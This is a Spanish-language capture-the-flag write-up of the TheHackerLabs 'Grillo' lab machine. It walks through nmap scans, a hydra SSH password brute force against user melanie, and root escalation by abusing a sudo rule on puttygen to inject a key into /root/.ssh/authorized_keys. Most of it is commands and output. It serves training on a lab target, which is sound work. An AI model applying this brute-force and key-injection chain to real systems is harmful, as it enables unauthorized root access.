---
title: "Grillo - TheHackerLabs"
date: 2025-02-11
draft: false
slug: "THL-writeup-grillo"
excerpt: "Esta fue una máquina muy sencilla. Después de aplicar los escaneos, descubrimos únicamente 2 puertos abiertos, siendo el puerto 80 y puerto 22. Revisando la página web, encontramos un mensaje al final de la página, dándonos una pista de que debemos aplicar fuerza bruta al servicio SSH. Encontramos la contraseña y nos logueamos. Dentro, vemos que podemos usar el binario puttygen como Root. Investigando este binario, vemos que podemos crear nuevas llaves e inyectarlas dentro del directorio authorized_keys del usuario Root, con lo que podremos escalar privilegios."
categories: ["TheHackerLabs", "Easy Machine"]
tags: ["Linux", "SSH", "Brute Force Attack", "Abusing Sudoers Privilege", "Abusing puttygen Binary", "SSH Key Injection", "Privesc - SSH Key Injection", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "hydra"
  - "ssh"
  - "sudo"
  - "puttygen"
  - "chmod"
  - "scp"
  - "ssh-keygen"
links:
  - "https://www.ssh.com/academy/ssh/putty/linux/puttygen"
  - "https://askubuntu.com/questions/15378/how-do-i-install-an-ssh-private-key-generated-by-puttygen"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-grillo/grillo.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.100
PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.
64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=2.07 ms
64 bytes from 192.168.1.100: icmp_seq=2 ttl=64 time=1.04 ms
64 bytes from 192.168.1.100: icmp_seq=3 ttl=64 time=2.21 ms
64 bytes from 192.168.1.100: icmp_seq=4 ttl=64 time=1.02 ms

--- 192.168.1.100 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3222ms
rtt min/avg/max/mdev = 1.017/1.584/2.210/0.559 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.100 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 13:34 CST
Initiating ARP Ping Scan at 13:34
Scanning 192.168.1.100 [1 port]
Completed ARP Ping Scan at 13:34, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:34
Scanning 192.168.1.100 [65535 ports]
Discovered open port 22/tcp on 192.168.1.100
Discovered open port 80/tcp on 192.168.1.100
Completed SYN Stealth Scan at 13:34, 8.16s elapsed (65535 total ports)
Nmap scan report for 192.168.1.100
Host is up, received arp-response (0.00064s latency).
Scanned at 2025-02-11 13:34:10 CST for 8s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Parece que solo hay 2 puertos abiertos.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.100 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-11 13:34 CST
Nmap scan report for 192.168.1.100
Host is up (0.00070s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))

|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Pienso que la intrusión será por la página web activa y me da curiosidad que únicamente es la página por defecto de **Apache2**, así que vamos a verla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-grillo/Captura1.png">
</p>

Como vimos en el escaneo, es solamente la página por defecto de **Apache2**.

Pero, si bajamos para ver lo demás, nos topamos con un mensaje:

<p align="center">
<img src="/assets/images/THL-writeup-grillo/Captura2.png">
</p>

Revisando el código fuente, también lo podremos ver:

<p align="center">
<img src="/assets/images/THL-writeup-grillo/Captura3.png">
</p>

Esto ya es una pista clara de lo que tenemos que hacer, pues si decides hacer **Fuzzing** no encontrarás nada.

Así que, vamos a aplicar fuerza bruta al **servicio SSH**.

## Explotación de Vulnerabilidades {#Explotacion}

### Aplicando Fuerza Bruta al Servicio SSH {#SSHFB}

Usaremos la herramienta **hydra** y utilizaremos el usuario que fue mencionado en la página web llamado **melanie**:
```bash
hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-11 13:43:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.100:22/
[STATUS] 270.00 tries/min, 270 tries in 00:01h, 14344132 to do in 885:27h, 13 active
[STATUS] 219.00 tries/min, 657 tries in 00:03h, 14343746 to do in 1091:37h, 12 active
[22][ssh] host: 192.168.1.100   login: melanie   password: *****
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-11 13:48:27
```
Excelente, encontramos la contraseña.

Comprobemos sí funciona:
```bash
ssh melanie@192.168.1.100
melanie@192.168.1.100's password: 
Linux grillo 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Apr 12 20:38:54 2024
melanie@grillo:~$ whoami
melanie
```
Bien, ya estamos dentro.

Ahora, busquemos la flag del usuario:
```bash
melanie@grillo:~$ ls
user.txt
melanie@grillo:~$ cat user.txt
...
```

## Post Explotación {#Post}

### Generando Nuevas Llaves para Servicio SSH con puttygen para Escalar Privilegios {#SSH}

Revisando los privilegios que tiene nuestro usuario, descubrimos que podemos usar un binario como **Root**:
```bash
melanie@grillo:~$ sudo -l
Matching Defaults entries for melanie on grillo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User melanie may run the following commands on grillo:
    (root) NOPASSWD: /usr/bin/puttygen
```

Desconozco este binario, así que vamos a investigarlo:

| **Binario puttygen** |
|:-----------:|
| *puttygen es una herramienta incluida en PuTTY que se usa para generar y gestionar claves SSH. Su función principal es crear claves en varios formatos compatibles con PuTTY, OpenSSH y otras aplicaciones de autenticación segura.* |

No sabía que existía esta herramienta que al parecer es similar a **ssh-keygen**.

Durante la investigación, se encontró el siguiente blog:
* <a href="https://www.ssh.com/academy/ssh/putty/linux/puttygen" target="_blank">Puttygen command line on Linux - SSH key generator</a>

Aquí, más que nada, nos explican los parámetros que podemos usar de la herramienta.

El siguiente blog, nos explica un poco más su uso:
* <a href="https://askubuntu.com/questions/15378/how-do-i-install-an-ssh-private-key-generated-by-puttygen" target="_blank">How do I install an SSH private key generated by PuTTYgen?</a>

Por lo que entiendo y con un poco de ayuda de **ChatGPT**, podemos generar una llave privada primero y después convertirla en una llave pública.

Vamos a hacerlo de 2 formas, primero solamente con el binario **puttygen** y luego usando **ssh-keygen**.

#### Utilizando puttygen para Escalar Privilegios {#puttygen}

Vamos a generar la llave privada primero, esta debe ser en formato para **OpenSSH**:
```bash
melanie@grillo:~$ puttygen -t rsa -b 4096 -O private-openssh -o id_rsa
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++++++++++++++++++++++++++
Enter passphrase to save key: 
Re-enter passphrase to verify:
```
Recuerda bien la frase que usaste para crear la llave privada, porque la vamos a usar más adelante.

Revisando lo que se generó, tenemos la llave privada y se genera un directorio de **PuTTY**:
```bash
melanie@grillo:~$ ls -la
total 32
drwx------ 3 melanie melanie    4096 feb 11 21:26 .
drwxr-xr-x 3 root    root       4096 abr 12  2024 ..
lrwxrwxrwx 1 root    root          9 abr 12  2024 .bash_history -> /dev/null
-rw-r--r-- 1 melanie concebolla  220 abr 12  2024 .bash_logout
-rw-r--r-- 1 melanie concebolla 3526 abr 12  2024 .bashrc
-rw------- 1 melanie concebolla 3311 feb 11 21:26 id_rsa
-rw-r--r-- 1 melanie concebolla  807 abr 12  2024 .profile
drwx------ 2 melanie concebolla 4096 feb 11 21:26 .putty
-rwxrwxrwx 1 root    root         33 abr 12  2024 user.txt
```

Asignémosle los permisos correctos a la llave privada:
```bash
melanie@grillo:~$ chmod 600 id_rsa
```

Ahora, vamos a convertir esa llave privada en una llave pública, pero la guardaremos dentro del directorio `.ssh/authorized_keys` del **usuario Root**:
```bash
melanie@grillo:~$ sudo puttygen /home/melanie/id_rsa -o /root/.ssh/authorized_keys -O public-openssh
Enter passphrase to load key:
```
Listo, parece que sí se creó la llave pública.

Para comprobarlo, vamos a descargar la llave privada en nuestra máquina y le damos los permisos correctos:
```bash
scp melanie@192.168.1.100:/home/melanie/id_rsa .
melanie@192.168.1.100's password: 
id_rsa                                    100% 3311   400.6KB/s   00:00
chmod 600 id_rsa
```

Ahora, vamos a usarla para autenticarnos como **Root**:
```bash
ssh -i id_rsa root@192.168.1.100
Enter passphrase for key 'id_rsa': 
Linux grillo 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
.
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr 21 11:35:18 2024
root@grillo:~# whoami
root
```
Funciono correctamente.

#### Utilizando ssh-keygen y puttygen para Escalar Privilegios {#SSHkey}

Como mencione antes, podemos convertir la llave privada en llave pública con **puttygen**. Entonces, podemos crear unas nuevas llaves con **ssh-keygen** y después con **puttygen**, creamos una llave pública dentro del directorio `.ssh/authorized_keys` del **usuario Root**.

Primero, vamos a crear las nuevas llaves con **ssh-keygen**:
```bash
melanie@grillo:~$ ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa
Generating public/private rsa key pair.
Created directory '/home/melanie/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/melanie/.ssh/id_rsa
Your public key has been saved in /home/melanie/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:PY1Bwe3... melanie@grillo
The key's randomart image is:
+---[RSA 4096]----+

|X*o o    .oo     |
|X= o o   .. o    |
|+E. .    ..=     |
| ..      .=+.    |
|  .   o S.+..    |
|   + o .o  o     |
|  o o =.o.+      |
|   . + =.++      |
|      . oB+.     |
+----[SHA256]-----+
```

Revisemos que se haya generado el directorio y las llaves:
```bash
melanie@grillo:~$ ls -la
total 36
drwx------ 4 melanie melanie    4096 feb 11 22:00 .
drwxr-xr-x 3 root    root       4096 abr 12  2024 ..
lrwxrwxrwx 1 root    root          9 abr 12  2024 .bash_history -> /dev/null
-rw-r--r-- 1 melanie concebolla  220 abr 12  2024 .bash_logout
-rw-r--r-- 1 melanie concebolla 3526 abr 12  2024 .bashrc
-rw------- 1 melanie concebolla 3311 feb 11 21:26 id_rsa
-rw-r--r-- 1 melanie concebolla  807 abr 12  2024 .profile
drwx------ 2 melanie concebolla 4096 feb 11 21:26 .putty
drwx------ 2 melanie concebolla 4096 feb 11 22:00 .ssh
-rwxrwxrwx 1 root    root         33 abr 12  2024 user.txt
melanie@grillo:~$ ls -la .ssh/
total 16
drwx------ 2 melanie concebolla 4096 feb 11 22:00 .
drwx------ 4 melanie melanie    4096 feb 11 22:00 ..
-rw------- 1 melanie concebolla 3434 feb 11 22:00 id_rsa
-rw-r--r-- 1 melanie concebolla  740 feb 11 22:00 id_rsa.pub
```

Ahora, utilicemos **puttygen** para convertir la llave privada que se generó con **ssh-keygen** en una llave pública dentro del directorio `.ssh/authorized_keys` del **usuario Root**:
```bash
melanie@grillo:~$ sudo puttygen /home/melanie/.ssh/id_rsa -O public-openssh -o /root/.ssh/authorized_keys
Enter passphrase to load key:
```
Funciono.

Copiemos la llave privada en nuestra máquina:
```bash
scp melanie@192.168.1.100:/home/melanie/.ssh/id_rsa .
melanie@192.168.1.100's password: 
id_rsa
```

Y usamos esa llave para autenticarnos como **Root**:
```bash
ssh -i id_rsa root@192.168.1.100
Enter passphrase for key 'id_rsa': 
Linux grillo 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
.
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 11 21:42:05 2025
root@grillo:~# whoami
root
```
Excelente, funciono correctamente.

Ya solo buscamos la flag del **Root**:
```bash
root@grillo:~# ls
root.txt
root@grillo:~# cat root.txt
...
```
Y con esto completamos la máquina.
